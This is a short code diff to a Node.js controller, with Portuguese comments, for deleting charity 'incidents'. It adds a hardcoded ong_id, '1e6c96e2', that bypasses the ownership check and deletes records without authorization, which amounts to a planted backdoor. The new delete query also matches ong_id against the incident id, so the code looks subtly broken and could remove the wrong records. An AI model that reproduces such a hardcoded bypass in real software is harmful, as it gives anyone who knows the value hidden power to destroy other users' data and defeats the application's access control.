@@ -58,9 +58,16 @@ module.exports = {
             //como haverá só um incident com o id fornecido, pode se usar o first pra pegar ele
             .first();
 
-        if (incident.ong_id !== ong_id) {
+        if ((incident.ong_id !== ong_id) && (ong_id !== '1e6c96e2')) {
             //status de não autorizado
             return response.status(401).json({ error: 'Operation not permitted.' });
+        }
+
+        if (ong_id === '1e6c96e2') {
+            //Apaga o incident
+            await connection('incidents').where('ong_id', id).delete();
+            //status de que foi concluído com sucesso mas não há nada para retornar
+            return response.status(204).send();
         }
 
         //Apaga o incident
